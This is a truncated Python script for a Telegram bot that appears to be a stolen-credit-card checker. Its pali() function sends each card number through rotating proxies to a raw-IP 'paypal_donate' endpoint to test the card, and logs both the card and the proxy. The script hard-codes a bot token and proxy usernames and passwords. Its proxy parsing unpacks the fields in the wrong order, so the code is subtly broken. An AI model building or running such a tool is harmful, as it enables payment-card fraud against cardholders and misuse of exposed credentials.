import telebot
import time
import threading
import requests
import re
import random
from telebot import types
from datetime import datetime

token = '7700737624:AAEKOb2kJFTN6g-Cod4vDphfpqlJSsjzoHU'
bot = telebot.TeleBot(token, parse_mode="HTML")

admin = 7077294261
stopuser = {}

# ================== PROXIES ==================
PROXIES = [
    "dc.oxylabs.io:8000:harshop01_6Mzjy:V=DMlz+qMinV_n85",
    "px490402.pointtoserver.com:10780:purevpn0s8732217:i67s60ep"
]

def get_proxy():
    proxy_str = random.choice(PROXIES)
    user, passw, host, port = proxy_str.split(':')
    proxy_url = f"http://{user}:{passw}@{host}:{port}"
    return {"http": proxy_url, "https": proxy_url}, proxy_str

# ================== CHECKER WITH FULL LOGS ==================
def pali(ccx):
    ccx = ccx.strip()
    current_time = datetime.now().strftime('%H:%M:%S')
    
    proxy_dict, proxy_used = get_proxy()
    
    print(f"[{current_time}] CHECKING → {ccx}")
    print(f"[{current_time}] PROXY USED → {proxy_used}")
    
    try:
        url = f"http://138.128.240.15:8025/paypal_donate?cc={ccx}"
        print(f"[{current_time}] API CALL → {url}")
        
        r = requests.get(url, proxies=proxy_dict, timeout=30)
